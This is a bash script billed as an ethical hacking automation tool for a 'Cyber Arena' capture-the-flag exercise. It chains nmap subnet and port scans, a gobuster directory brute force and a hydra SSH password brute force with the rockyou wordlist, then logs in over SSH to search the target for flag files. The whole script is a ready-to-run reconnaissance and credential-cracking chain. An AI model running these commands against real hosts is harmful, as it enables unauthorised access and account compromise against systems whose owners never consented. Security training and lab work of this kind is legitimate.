#!/bin/bash

# Seamedu Cyber Arena - Ethical Hacking Automation Script
# Only CLI tools are used - NO GUI.

echo "🔍 Starting Network Scan..."
read -p "Enter subnet to scan (e.g., 192.168.1.0/24): " subnet
nmap -sn $subnet -oG live_hosts.txt
echo "✅ Live hosts saved to live_hosts.txt"

echo "---------------------------------------------"
cat live_hosts.txt | grep Up | awk '{print $2}' > hosts.txt
echo "Discovered IPs:"
cat hosts.txt

read -p "Enter target IP from above: " target_ip

echo "🔎 Scanning open ports on $target_ip..."
nmap -sS -sV -oN port_scan_$target_ip.txt $target_ip
echo "✅ Port scan saved to port_scan_$target_ip.txt"

echo "---------------------------------------------"
echo "🕷️ Running directory brute force (Gobuster)"
read -p "Enter target website URL (e.g., http://$target_ip): " url
gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt -o gobuster_$target_ip.txt
echo "✅ Gobuster results saved to gobuster_$target_ip.txt"

echo "---------------------------------------------"
echo "🔐 Starting Hydra SSH brute-force"
read -p "Enter SSH username: " ssh_user
hydra -l $ssh_user -P /usr/share/wordlists/rockyou.txt ssh://$target_ip -o hydra_$target_ip.txt
echo "✅ Hydra results saved to hydra_$target_ip.txt"

echo "---------------------------------------------"
echo "📂 Searching for potential flag files"
ssh $ssh_user@$target_ip 'find / -type f -iname "*flag*" 2>/dev/null' > found_flags.txt
echo "✅ Flag locations saved to found_flags.txt"

echo "🚩 Done! Check output files for details."
